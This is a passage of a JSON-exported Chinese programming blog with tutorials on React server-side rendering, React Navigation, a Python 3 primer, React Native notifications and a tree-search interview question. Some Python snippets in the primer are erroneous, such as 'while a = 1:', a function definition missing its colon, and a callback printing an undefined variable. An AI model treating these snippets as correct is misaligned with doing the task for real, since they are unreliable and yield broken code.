name=\"viewport\" content=\"width=device-width,initial-scale=1\"&gt; &lt;meta name=\"referrer\" content=\"never\"&gt; &lt;link rel=\"shortcut icon\" href=\"/favicon.ico\"&gt; &lt;title&gt;React App&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"root\"&gt; &lt;%- app %&gt; &lt;/div&gt; &lt;script&gt; window.__STATE__ = (&lt;%- state %&gt;) &lt;/script&gt; &lt;script type=\"text/javascript\" src=\"/static/js/main.2ebb5379.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 最后启动服务： 1babel-node app.js 访问：http://127.0.0.1:3000 查看源码查看 html 的源代码可以看到，React首屏服务端渲染的目标已经完成。 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"&gt; &lt;meta name=\"referrer\" content=\"never\"&gt; &lt;link rel=\"shortcut icon\" href=\"/favicon.ico\"&gt; &lt;title&gt;React App&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"root\"&gt; &lt;div data-reactroot=\"\" data-reactid=\"1\" data-react-checksum=\"780676788\"&gt; &lt;h2 data-reactid=\"2\"&gt;Hello&lt;/h2&gt; &lt;div data-reactid=\"3\"&gt;&lt;/div&gt; &lt;input type=\"text\" data-reactid=\"4\"/&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; window.__STATE__ = (&#123;\"text\":\"呵呵呵\"&#125;) &lt;/script&gt; &lt;script type=\"text/javascript\" src=\"/static/js/main.2ebb5379.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 说明： root 的数据从 renderToString() 里来 __STATE__ 的数据从 state 里来 发生了什么？首先，React的组件在服务端进行渲染，得到渲染结果后的字符串模板，嵌入 HTML 结构里，最后把初始化的状态赋值在一个window.__STATE__变量里。 以往的React单页面应用，是首屏是一个简单化没有数据的 HTML 结构，这样在首次加载时需要向后端发起请求，来获取数据。而现在，数据直接从后端获取，并且把首次加载的结构也渲染了。 为什么需要服务端渲染？什么情况下进行服务端渲染？当我们要求渲染时间尽量快、页面响应速度快时（优点），才会采用服务器渲染，并且应该按需对页面进行渲染，首次加载/首屏。即服务端渲染的优势在于：由中间层（node 端）为客户端请求初始数据、并由 node 渲染页面。 客户端渲染路线： 请求一个 html -&gt; 服务端返回一个 html -&gt; 浏览器下载 html 里面的 js/css 文件 -&gt; 等待 js 加载并初始化完成 -&gt; js 代码终于可以运行，由js代码向后端请求数据（ajax/fetch） -&gt; 等待后端数据返回 -&gt; react-dom（客户端）从无到完整地，把数据渲染为响应页面 服务端渲染路线： 请求一个html -&gt; 服务端请求数据( 内网请求快 ) -&gt; 服务器初始化渲染组件与数据（服务端性能好，较快） -&gt; 服务端返回已经有正确内容的页面 -&gt; 客户端请求 js/css 文件 -&gt; 等待 js 加载并初始化完成 -&gt; react-dom（客户端）把剩下一部分渲染完成（内容小，渲染快） 同构技术React 服务端渲染，看其他更像是一种同构技术（Universal），前后端共用一套代码。 目前为止： 性能： SPA 需要更多的客户端代码，需要下载数据的体积也更大。这使得手机加载速度很慢。 SEO： 因为单页面应用依赖于 JavaScript 的执行，服务器不会提供它们可能用到的任何 HTML 内容。因此，web 爬虫很难去索引到这些页面。 所谓的同构 JavaScript 应用： 同构 JavaScript 应用基于 JavaScript 编写，可以在客户端和服务端运行。正因为此，你只需要写一次代码，就可以在服务端渲染静态页面，还可以在客户端完成复杂的交互。所以，这种方式互通了两个世界，并且避免了前面提到了两个问题。 需要注意的地方原来的应用是 SPA，要迁移到 SSR 需要注意几个问题。 根据 url 初始化数据很多时候需要根据 url 来初始化数据。 1234567891011121314151617181920212223242526272829303132333435363738function renderFullPage(html, initialState) &#123; return ` &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Redux Universal Example&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"root\"&gt;$&#123;html&#125;&lt;/div&gt; &lt;script&gt; window.__INITIAL_STATE__ = $&#123;JSON.stringify(initialState)&#125; &lt;/script&gt; &lt;script src=\"/static/bundle.js\"&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; `;&#125;router.use('/home', async ctx =&gt; &#123; // getinitState 是从数据库来取出的数据并整理成 state let initialState = await getinitState(); // 创建新的 Redux store 实例 const store = createStore(counterApp, initialState); // 把组件渲染成字符串 const html = renderToString( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt; ); // 从 Redux store 得到初始 state const finalState = store.getState(); // 把渲染后的页面发给客户端 ctx.body = renderFullPage(html, finalState);&#125;) 前后端环境SSR 需要共用一套代码，这就意味着需要前后端环境的判断。 1234const isEnv = require('is-env');isEnv('nodejs');// 或者const isNode = typeof window === 'undefined'; 在 Nodejs 里是没有 window 对象的，因此可以利用 window 对象来判断环境。 资源加载差异我们在进行组件化开发的模式式，样式文件也是通过 require 方法来引入的，而 Node 同样是无法默认解析样式文件的。类似的，一些浏览器环境需要的工具脚本，一定是依赖浏览器 API 的（BOM 对象），所以也不应该在 Node 加载，于是就有了： 1234567891011121314151617if (isNode) &#123; // 服务端需要的资源&#125;else &#123; // 组件样式 require('./Main.less'); // 工具 const ajax = require('js/ajax.js'); ... // 前端渲染组件，服务端渲染时不需要 const SlidingBar = require('../../components/SlidingBar.jsx'); // 一些mixin也不需在Node加载 ...&#125; 生命周期方法React 组件在服务端只有 componentDidMount 之前的方法会被执行（之后已经到了前端那里了）。因此也要保证在 getInitialState、render 等方法中不会使用到浏览器 API，而将相应的操作放到 componentDidMount 中执行。 1234567891011class App extends Component &#123; componentDidMount() &#123; // ... 在这里执行 &#125; render() &#123; return ( &lt;div&gt;...&lt;/div&gt; ) &#125;&#125; 后端性能相关请求放在后端渲染，势必会多一些压力点。除了需要在接入层做到负载均衡，在缓存上也可以考虑分布式缓存等优化策略。在数据超时的情况，也需要保证页面的正常输出，而此时返回的内容其实就等同于非服务端渲染的 HTML 页面内容。 参考资料 http://www.alloyteam.com/2015/10/8783/","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"服务端渲染","slug":"服务端渲染","permalink":"http://me.lizhooh.com/tags/服务端渲染/"}]},{"title":"React Native 新 Navigation 的使用","slug":"React Native/Router/React Native 新 Navigation 的使用","date":"2017-05-11T11:51:13.000Z","updated":"2021-06-15T06:10:52.868Z","comments":true,"path":"/stories/2017/05/React Native/Router/React Native 新 Navigation 的使用/","link":"","permalink":"http://me.lizhooh.com/stories/2017/05/React Native/Router/React Native 新 Navigation 的使用/","excerpt":"Navigation最近 React-Native 0.44.0 发布了，发现原有的 Navigation 从 React-Native 移除，剥离到了一个名为 react-native-deprecated-custom-components 的单独模块中。如果你需要继续使用Navigator，则需要先 npm 再 import 即： 123npm install -save react-native-deprecated-custom-components// -----import &#123; Navigator &#125; from 'react-native-deprecated-custom-components';","text":"Navigation最近 React-Native 0.44.0 发布了，发现原有的 Navigation 从 React-Native 移除，剥离到了一个名为 react-native-deprecated-custom-components 的单独模块中。如果你需要继续使用Navigator，则需要先 npm 再 import 即： 123npm install -save react-native-deprecated-custom-components// -----import &#123; Navigator &#125; from 'react-native-deprecated-custom-components'; React-Navigation然而这时候，官方则推荐另一个库来取代 Navigation，它是 React-Navigation。可以同时在 React 与 React-Native 中使用的导航器，并且有着更友好的 API 设计。 官网： https://reactnavigation.org/ 安装： 1npm install --save react-navigation 使用安装完之后，就可以快速创建一个有两个页面（Main和Profile）的应用了。下面看看它的全新的 API 设计： TabNavigator下面是一个 tab 导航器的例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import React, &#123; Component &#125; from 'react';import &#123; StyleSheet, View, Text, Image, TouchableOpacity as Touch,&#125; from 'react-native';import &#123; StackNavigator, TabNavigator,&#125; from 'react-navigation';class MainScreen extends Component &#123; static navigationOptions = &#123; tabBarLabel: 'tab1', // tab 的 label 名称 &#125;; render() &#123; const &#123; navigate &#125; = this.props.navigation; return ( &lt;Touch style=&#123;$.touch&#125; onPress=&#123;event =&gt; navigate('Setup')&#125;&gt; &lt;Text style=&#123;$.text&#125;&gt;Go to Setup Tab&lt;/Text&gt; &lt;/Touch&gt; ); &#125;&#125;class SetupScreen extends Component &#123; static navigationOptions = &#123; tabBarLabel: 'tab2', // tab 的 label 名称 &#125;; render() &#123; const &#123; goBack &#125; = this.props.navigation; return ( &lt;Touch style=&#123;$.touch&#125; onPress=&#123;event =&gt; goBack()&#125;&gt; &lt;Text style=&#123;$.text&#125;&gt;Go back to home tab&lt;/Text&gt; &lt;/Touch&gt; ); &#125;&#125;export default App = TabNavigator(&#123; Main: &#123; screen: MainScreen &#125;, // tab 按顺序从左到右 Setup: &#123; screen: SetupScreen &#125;,&#125;);const $ = StyleSheet.create(&#123; contanier: &#123; flex: 1, backgroundColor: '#fff', &#125;, touch: &#123; backgroundColor: '#3bf', paddingHorizontal: 15, paddingVertical: 8, alignItems: 'center', justifyContent: 'center', margin: 10, borderRadius: 2, &#125;, text: &#123; color: '#fff', &#125;&#125;); 效果： StackNavigator下面的一个 stack 的导航器： 12345678910// 在 navigationOptions 加上 titlestatic navigationOptions = &#123; tabBarLabel: 'tab1', title: 'Home',&#125;;// 代码只是把 TabNavigator 换成 StackNavigatorexport default App = StackNavigator(&#123; Main: &#123; screen: MainScreen &#125;, // 第一页 Profile: &#123; screen: ProfileScreen &#125;, // 第二页&#125;); 效果： 传递数据在 Navigation 上传递数据是这样的： 1234this.props.navigator.push(&#123; name: '小明', component: 'User',&#125;); 而在 React-Navigation 上传递数据是这样的： 12345// 从自动注入的 props.navigate 里获取到 navigateconst &#123; navigate &#125; = this.props.navigation;// 第一个参数是组件名称，第二个参数是要创建的数据navigate('Chat', &#123; user: 'Lucy' &#125;); 接收参数： 12// 从自动注入的 props.navigation 里获取 stateconst &#123; params &#125; = this.props.navigation.state; 配置项1234567891011121314151617181920212223242526272829&#123; tabBarOptions: &#123; tabStyle: &#123; // tab style height: 35, &#125;, labelStyle: &#123; // 标签 style fontSize: 18, color: '#fff', marginVertical: 0, marginBottom: 0 + 3, textShadowColor: 'rgba(1, 1, 1, 0.6)', textShadowOffset: &#123; width: 0, height: 1, &#125;, textShadowRadius: 3, fontWeight: '600', &#125;, indicatorStyle: &#123; // 下划线 backgroundColor: '#ffffff', height: 2, borderRadius: 1, &#125;, style: &#123; // tab contanier style backgroundColor: 'transparent', &#125;, &#125;, backBehavior: !false, // 是占用后退键&#125; DrawerNavigator想使用 Drawer，可以使用 React-Native 自带的 DrawerLayoutAndroid 。但是它只限制于 Android 平台。 React-Navigation 中有一个 DrawerNavigator，它是跨平台的，而且有很友好的 API 设计。 下面是示例代码： 12345678910// DrawerNavigator(routeMaps, routeconfig);export default App = DrawerNavigator( &#123; // 主视图，这里可以有多个，用来导航跳转，跳转方式是与 StackNavigator 一样 Main: &#123; screen: MainScreen &#125;, &#125;, &#123; drawerWidth: 300, // drawer 宽度 drawerPosition: 'left', // drawer 方向 &#125;); 效果： 如果在新版本报错：Undefined is not an object (evaluating route.routeName)。 请在 config 添加上： 123drawerOpenRoute: 'DrawerOpen',drawerCloseRoute: 'DrawerClose',drawerToggleRoute: 'DrawerToggle', 关闭与打开12this.props.navigation.closeDrawer();this.props.navigation.openDrawer(); 自定义菜单内容默认情况下，抽屉是可滚动的，只包含 RouteConfig 中路由的链接。 12345678910111213141516171819202122232425262728293031323334class App extends Component &#123; static navigationOptions = &#123; drawerLabel: 'Home', drawerIcon: (&#123; tintColor &#125;) =&gt; ( &lt;Text&gt;A&lt;/Text&gt; ), &#125; render() &#123; return ( &lt;View&gt; &lt;Text&gt;daskldk&lt;/Text&gt; &lt;/View&gt; ); &#125;&#125;export default DrawerNavigator(&#123; Home: &#123; screen: App, &#125;, About: &#123; screen: About, &#125;, Setting: &#123; screen: Setting, &#125;,&#125;, &#123; drawerOpenRoute: 'DrawerOpen', drawerCloseRoute: 'DrawerClose', drawerToggleRoute: 'DrawerToggle',&#125;); 毫无疑问的，你看到的是这样的画面： 默认情况下，DrawerNavigator 会自动根据 routeMaps 生成一个菜单内容，当然我们也可以自己去自定义。 自定义的方式就是指定 contentComponent。 下面演示如何，保留默认的菜单内容，并添加头部和尾部内容。 123456789101112131415161718192021import &#123; DrawerItems, SafeAreaView &#125; from 'react-navigation';const Menu = (props) =&gt; ( &lt;ScrollView&gt; &lt;SafeAreaView style=&#123;&#123; flex: 1 &#125;&#125; forceInset=&#123;&#123; top: 'always', horizontal: 'never' &#125;&#125; &gt; &lt;View style=&#123;&#123; height: 220 &#125;&#125;&gt; &lt;Text&gt;头部信息&lt;/Text&gt; &lt;/View&gt; &lt;DrawerItems &#123;...props&#125; /&gt; &lt;View&gt; &lt;Text&gt;尾部信息&lt;/Text&gt; &lt;/View&gt; &lt;/SafeAreaView&gt; &lt;/ScrollView&gt;);// ....contentComponent: Menu, 参考资料 http://facebook.github.io/react-native/docs/navigation.html https://reactnavigation.org/docs/navigators/drawer https://reactnavigation.org/","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"Python3 快速入门","slug":"Python/Python3 快速入门","date":"2017-05-06T09:34:07.000Z","updated":"2021-06-15T06:10:52.851Z","comments":true,"path":"/stories/2017/05/Python/Python3 快速入门/","link":"","permalink":"http://me.lizhooh.com/stories/2017/05/Python/Python3 快速入门/","excerpt":"基本类型Python3 中有六个标准的数据类型： Number（数字） String（字符串） List（列表） Tuple（元组）：与列表类似，不同之处在于元组的元素不能修改。元组使用小括号，列表使用方括号。 Sets（集合） Dictionary（字典）","text":"基本类型Python3 中有六个标准的数据类型： Number（数字） String（字符串） List（列表） Tuple（元组）：与列表类似，不同之处在于元组的元素不能修改。元组使用小括号，列表使用方括号。 Sets（集合） Dictionary（字典） 注释单行注释以 # 开头多行注释用三个单引号（&#39;&#39;&#39;）或者三个双引号（&quot;&quot;&quot;）将注释括起来 控制流程条件语句： 123456if a &gt; b: # ...elif a == b: # ...else: # ... 循环：在 while … else 在条件语句为 false 时执行 else 的语句块： 123456789while a &gt; 1： # ...else: # ...for i in list: # ...else: # ... range() 函数：如果你需要遍历数字序列，可以使用内置range()函数。它会生成数列，例如： range(start, end, step) 123a = ['Google', 'Baidu', 'Runoob', 'Taobao', 'QQ']for i in range(len(a)): print(i, a[i]) pass 语句： Python pass是空语句，是为了保持程序结构的完整性。pass 不做任何事情，一般用做占位语句，如下实例 12while a = 1: pass end：end 指定在 print 里输出在同一行 1print (x, end = ' ') 列表函数 函数 说明 len(list) 列表元素个数 max(list) 返回列表元素最大值 min(list) 返回列表元素最小值 list(seq) 将元组转换为列表 迭代器迭代器有两个基本的方法：iter() 和 next() 12345678list=[1, 2, 3, 4]it1 = iter(list) # 创建迭代器对象it2 = iter(list)for x in it1: print (x, end = ' ')# 手动 nextprint (next(it2)) 函数 函数代码块以 def 关键词开头，后接函数标识符名称和圆括号 () 任何传入参数和自变量必须放在圆括号中间，圆括号之间可以用于定义参数 函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明 函数内容以冒号起始，并且缩进 return [表达式] 结束函数，选择性地返回一个值给调用方。不带表达式的 return 相当于返回 None def 函数名（参数列表）: 函数体 12345678910111213141516# 计算面积函数def area(width = 0, height = 0): return width * height# 还可以像 sass 一样指定参数名print( area(width = 10))# 不定参数，类似 es6 ...argdef printinfo(arg1, *vartuple): print (\"输出: \") print (arg1) for var in vartuple: print (var) return 匿名函数：lambda 只能写一行 lambda [arg1 [,arg2,…..argn]]:expression 12# 类似 es6 const sum = (a, b) =&gt; a + b;sum = lambda a, b: a + b 回调函数：python 不支持那种匿名的回调函数玩法，只能声明式的函数命名。 12345678def add(a, b, cb) c = a + b cb(c)def test(result): print ('a + b = %.2f' % c)add(1, 2, test) 但是对于只有一行的代码却可以用 lambda 最为回调函数。 1t = timer(3, lambda futu: print('Done')) global 和 nonlocal 关键字当内部作用域想修改外部作用域的变量时，就要用到global和nonlocal关键字了。 12345678910def test(): global c # 修改全局变量，需要声明 c = 5def outer(): num = 10 def inner(): nonlocal num # nonlocal关键字声明，嵌套作用域 num = 100 print(num) 它们的差别是一个用于修改全局变量，一个用于修改局部变量。 列表推导式这是一种很特别的玩法。每个列表推导式都在 for 之后跟一个表达式，然后有零到多个 for 或 if 子句。返回结果是一个根据表达从其后的 for 和 if 上下文环境中生成出来的列表。如果希望表达式推导出一个元组，就必须使用括号。 12345list = [1, 3, 5]a = [i * 2 for i in list]b = [[i * 2, i * 3] for i in list]print (a) # [2, 6, 10]print (b) # [[2, 3], [6, 9], [10, 15]] 可以用 if 子句作为过滤器： 1[3 * x for x in vec if x &gt; 3] 多个 for： 123456vec1 = [2, 4, 6]vec2 = [4, 3, -9][x * y for x in vec1 for y in vec2] 列表推导式可以使用复杂表达式或嵌套函数： 1234[ str(round(355 / 113, i)) for i in range(1, 6)] 列表推导写法灵活轻巧，但是欠缺阅读性，不建议大量写列表推导。 del 语句使用 del 语句可以从一个列表中依索引而不是值来删除一个元素。 123456a = [1, 3, 5, 7, 9]del a[0:3] # 把 0 ~ 3 删了print (a) # [7, 9]del a # 把 a 删了print (a)# NameError: name 'a' is not defined 集合 set集合是一个无序不重复元素的集。基本功能包括关系测试和消除重复元素。 1234567891011a = set('123456')b = set('345678')s = set(&#123; 'a': 1, 'b': 2&#125;) # &#123; 'b', 'a' &#125;l = set([1, 2, 3])c = set((1, 2, 3))print (a - b) # &#123;'1', '2'&#125; 在 a, 不在 bprint (b - a) # &#123;'8', '7'&#125; 在 b, 不在 aprint (a | b) # &#123;'2', '7', '6', '5', '1', '3', '4', '8'&#125; 在 a 或 bprint (a &amp; b) # &#123;'3', '4', '6', '5'&#125; 在 a 和 bprint (a ^ b) # &#123;'2', '7', '1', '8'&#125; 在 a 和 b，但不同时在 a, b 集合也支持推导式： 1234&#123; x for x in 'abracadabra' if x not in 'abc'&#125; 字典 dict创建方式，可以是使用 {} 或者 dict 遍历： 12345678910111213str = &#123; 'gallahad': 'the pure', 'robin': 'the brave'&#125;for value in str.values(): print (value)for key in str.keys(): print (key)for key, value in str.items(): print (key, value) 生成器（generator）类的 ES6 的 generator 1234567891011def fibonacci(n): # 生成器函数 - 斐波那契 a, b, counter = 0, 1, 0 while True: if (counter &gt; n): return yield a a, b = b, a + b counter += 1f = fibonacci(10) # f 是一个迭代器，由生成器返回生成# next(f) 装饰器async，await在 Python 里的 async，await 语法与 ES6+ 的 async，await 有几分类似。它们都需要在一个异步函数里使用。 12345678async def p1(): print(1)async def p2(): print(2)p1()p2() 上面的代码会报错：RuntimeWarning: coroutine &#39;p1&#39; was never awaited 在 Python 里 async，await 是靠 协程 运行的，一个异步函数需要 await 来等待，函数调用后返回的是一个协程对象。在 ES6+ 我们有 Promise 来等待一个异步函数的完成。 12345async function p1() &#123; console.log(1);&#125;p1().then(res =&gt; console.log('完成了')); 而 Python 里没有 Promise 怎么办，没办法只能用 send 了。 123456789101112async def p1(): print(1)async def p2(): print(2)async def run(): await p1() await p2() print('完成了')run().send(None) 上面的代码运行后会抛出异常：StopIteration，可以直接去无视它。 1234try: # 尝试启动一个协程 run().send(None)except StopIteration: # 无视这个异常 pass 除此之外还可以使用 asyncio 来执行 async 函数。 12345678910111213141516171819202122232425262728import asyncioimport timenow = lambda: time.time()async def work(x): print(\"Waiting \" + str(x)) await asyncio.sleep(x)start = now()loop = asyncio.get_event_loop() # 获取事件循环loop.run_until_complete(work(3)) # 执行一个 async function# 并发执行loop.run_until_complete(asyncio.wait([ work(1), work(2), work(3),]))print('run time:', now() - start)# Waiting 3# Waiting 1# Waiting 2# Waiting 3# run time: 5.993342638015747 所以让协程对象运行的话，有三种方式： 在另一个已经运行的协程中用 await 等待它。 通过 loop 函数计划它的执行。 使用 send 启动执行它。 自定义模块同级目录： 123-- src |-- m1.py `-- hello.py 12345678910111213# m1.pya = 1# ------------------ ## hello.pyimport m1# 在 m1.py 里，导入 a 这个变量from m1 import a# 在 m1.py 里，导入全部变量from m1 import *print (m1.a) # 1 不同级目录： 12345-- src |-- mod | |-- __init__.py | `-- add.py `-- test.py 这种情况，想要在test中导入add，则需要在 add 文件夹中创建空文件__init__.py文件(也可以在该文件中自定义输出模块接口)然后使用 from mod.add import * 或 import mod.add，使用时要使用全称。 别名：使用as可以指定别名，比如：import redis as rd 美化输出1234for x in range(1, 11): print('&#123;0:2d&#125; &#123;1:3d&#125; &#123;2:4d&#125;'.format(x, x * x, x * x * x))print(\"%s 说: 我 %d 岁了，我在读 %d 年级\" % ('我', '20', '1')) 键盘输入12str = input(\"请输入：\")print (\"你输入的内容是: \", str) 查看属性与方法可以使用 dir 查看属性与方法，返回的是一个数组，包括了这个对象的所有 key。因为 Python 带下划线的是私有函数，所以把 _ 开头的过滤一下。 123for i in dir(data): if str(i)[0] != '_': print(i) 或者通过判断类型，来区别是否是函数或者是属性： 12345678910111213def showKeys(obj): func = [] props = [] for i in dir(obj): if str(i)[0] != '_': if hasattr(eval('obj.' + i), '__call__'): func.append(i) else: props.append(i) print ('函数：', func) print ('属性：', props) 判断是否是函数可以通过以下方式，因为 Python 不支持通过 key 来调用函数，所有使用了 eval 这种暴力方法。 12print(hasattr(eval('obj.add'), '__call__')) # Trueprint(callable(eval('obj.add'))) # True 文件读写打开与关闭文件： f = open(filename, mode) f.close() 默认是不支持中文编码的。 12f = open('./test.js', 'r')f.close() 使用 utf8： 12import codecsf = codecs.open('./a.js', 'r', 'utf-8') 读写： f.write(str) f.writeline(str) f.read() f.readline() 异常处理123456try: # ...except types: # 异常类型 # ...else: #... 类型转换 方法 使用 tuple(s) 将序列 s 转换为一个元组。 list(s) 将序列 s 转换为一个列表。 set(s) 转换为可变集合。 dict(d) 创建一个字典。d 必须是一个序列 (key,value) 元组。 int(x [,base]) 将 x 转换为一个整数。 float(x) 将 x 转换到一个浮点数。 complex(real [,imag]) 创建一个复数。 str(x) 将对象 x 转换为字符串。 repr(x) 将对象 x 转换为表达式字符串。 chr(x) 将一个整数转换为一个字符。 ord(x) 将一个字符转换为它的整数值。 类语法格式如下： class ClassName: 12345678910# 定义class MyClass: i = 12345; def say(self): # 每个函数都带一个 self，并且在第一个参数 return 'hello world ' + str(self.i);# 使用，python 中没有 newx = MyClass();print(x.say()); # hello world 12345 构造函数1234567class Student: def __init__(self, name): self.data = []; self.name = name;stu = Student('小明');print (stu.name); # 小明 self 代表类的实例，而非类类的方法与普通的函数只有一个特别的区别——它们必须有一个额外的第一个参数名称, 按照惯例它的名称是 self。（也可以写 this） 私有属性私有属性用 __filed 来表示（双下划线），外部无法访问。 123class people: # 私有属性 __weight = 0; 继承 class DerivedClassName(modname.BaseClassName): Python 的继承需要手动调用父类的 __init__。 12345678910# 单继承示例class student(people): grade = ''; def __init__(self, n, a, w, g): # 调用父类的构函 people.__init__(self, n, a, w); self.grade = g; # 覆写父类的方法 def speak(self): print(\"%s 说: 我 %d 岁了，我在读 %d 年级\" % (self.name, self.age, self.grade)); 多继承 class DerivedClassName(Base1, Base2, Base3): 12345# 多重继承class sample(speaker, student): def __init__(self, n, a, w, g, t): student.__init__(self, n, a, w, g) speaker.__init__(self, n, t) 方法重写如果你的父类方法的功能不能满足你的需求，你可以在子类重写你父类的方法。直接通过同名重写。 12345678class Parent: # 定义父类 def myMethod(self): print ('调用父类方法')class Child(Parent): # 定义子类 def myMethod(self): Parent.myMethod(self); print ('调用子类方法') 类的专有方法可以对某些方法进行重写。 属性 说明 __init__ 构造函数，在生成对象时调用。 __del__ 析构函数，释放对象时使用。 __repr__ 打印，转换。 __setitem__ 按照索引赋值。 __getitem__ 按照索引获取值。 __len__ 获得长度。 __cmp__ 比较运算。 __call__ 函数调用。 __add__ 加运算。 __sub__ 减运算。 __mul__ 乘运算。 __div__ 除运算。 __mod__ 求余运算。 __pow__ 称方。 运算符重载Python 支持运算符重载，可以对类的专有方法进行重载，实例如下： 1234567891011121314class Vector: def __init__(self, a, b): self.a = a; self.b = b; def __str__(self): return 'Vector (%d, %d)' % (self.a, self.b); def __add__(self, other): return Vector(self.a + other.a, self.b + other.b);v1 = Vector(2, 10);v2 = Vector(5, -2);print (v1 + v2); JSONJSON (JavaScript Object Notation) 是一种轻量级的数据交换格式，易于人阅读和编写。在 Python 里主要使用到了 json 库的两个 API： json.dumps 把对象序列化为 json 字符串 json.loads 把 json 字符串解析为对象 123456789101112131415import jsondata = [&#123; 'a': 1, 'b': 2, 'c': 3, 'd': 4, 'e': 5&#125;]jsonString = json.dumps(data) # 把对象序列化为 json 字符串jsonData = json.loads(jsonString) # 把 json 字符串解析为对象print ('jsonString', jsonString)print ('jsonData', jsonData) 标准库 库 说明 import os os 模块提供了不少与操作系统相关联的函数。 import sys 通用工具脚本经常调用命令行参数。这些命令行参数以链表形式存储于 sys 模块的 argv 变量。 import re re 模块为高级字符串处理提供了正则表达式工具。 import math math 模块为浮点运算提供了对底层 C 函数库的访问。 import random random 提供了生成随机数的工具。 from datetime import date datetime 模块为日期和时间处理同时提供了简单和复杂的方法。 import json json 库。 非标准库 库 说明 import requests 提供网络编程相关的函数 pip install requests。 import pymongo mongodb 客户端 pip install pymongo。 import redis redis 客户端 pip install redis。","categories":[{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/categories/Python/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/tags/Python/"}]},{"title":"React Native 发送通知","slug":"React Native/React Native 发送通知","date":"2017-04-19T13:24:37.000Z","updated":"2021-06-15T06:10:52.861Z","comments":true,"path":"/stories/2017/04/React Native/React Native 发送通知/","link":"","permalink":"http://me.lizhooh.com/stories/2017/04/React Native/React Native 发送通知/","excerpt":"","text":"前言在 Android 里发送通知使用的是 Notifications。在 React Native 里这由第三方提供的一个包：react-native-notifications 可以实现类似的功能。 安装12npm install react-native-notifications --savereact-native link react-native-notifications 之后需要修改一处地方： 1new RNNotificationsPackage(MainApplication.this) 基本使用1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import &#123; NotificationsAndroid, PendingNotifications &#125; from 'react-native-notifications';export default class MainComponent extends Component &#123; constructor(props) &#123; super(props); // 监听通知打开信息 NotificationsAndroid.setRegistrationTokenUpdateListener(this.onPushRegistered); // 监听通知打开信息 NotificationsAndroid.setNotificationOpenedListener(this.onNotificationOpened); // 监听通知收到信息 NotificationsAndroid.setNotificationReceivedListener(this.onNotificationReceived); &#125; // 本地推送通知 onClick = e =&gt; &#123; // 返回通知的唯一标识 this.lastNotificationId = NotificationsAndroid.localNotification(&#123; title: '本地通知', body: '这里有一个通知', data: 'abc', // 可以是数组、对象等可被 json 序列化的数据 &#125;); &#125; async componentDidMount() &#123; // 获取初始化的通知信息，从通知栏点进来的时候 PendingNotifications.getInitialNotification() .then((notification) =&gt; &#123; console.log(\"获取初始化的通知信息:\", notification); &#125;) .catch((err) =&gt; console.error(\"getInitialNotifiation failed\", err)); &#125; // 撤销 onCancelNotification = () =&gt; &#123; if (this.lastNotificationId) &#123; // 撤销一个通知，需要通知的 id NotificationsAndroid.cancelLocalNotification(this.lastNotificationId); this.lastNotificationId = undefined; &#125; &#125; // 检查权限 async onCheckPermissions() &#123; const hasPermissions = await NotificationsAndroid.isRegisteredForRemoteNotifications(); if (hasPermissions) &#123; alert('Yay! 你有权限'); &#125; else &#123; alert('Boo! 你没有打开权限'); &#125; &#125; onPushRegistered = () =&gt; &#123; // ... &#125; onNotificationOpened = notification =&gt; &#123; console.log(notification.getData()); &#125; onNotificationReceived = notification =&gt; &#123; console.log(\"onNotificationReceived: \", notification); &#125;&#125;","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"前端：一道数据结构面试题目","slug":"前端/前端一道数据结构题目","date":"2017-04-15T04:58:38.000Z","updated":"2021-06-15T06:10:52.906Z","comments":true,"path":"/stories/2017/04/前端/前端一道数据结构题目/","link":"","permalink":"http://me.lizhooh.com/stories/2017/04/前端/前端一道数据结构题目/","excerpt":"分析某公司的面试题，如下图： 题目：现在给出一个 data 数据结构，包括 id, name, children 三个属性。实现一个函数 findNode，通过给出 id 输出节点信息。","text":"分析某公司的面试题，如下图： 题目：现在给出一个 data 数据结构，包括 id, name, children 三个属性。实现一个函数 findNode，通过给出 id 输出节点信息。 一看，就知道大概是怎么做的了，无非就是深度搜索。 解题测试数据： 1234567891011121314151617181920212223242526272829303132const data = &#123; id: 1, name: 'a', children: [ &#123; id: 2, name: 'b', children: null, &#125;, &#123; id: 3, name: 'c', children: [ 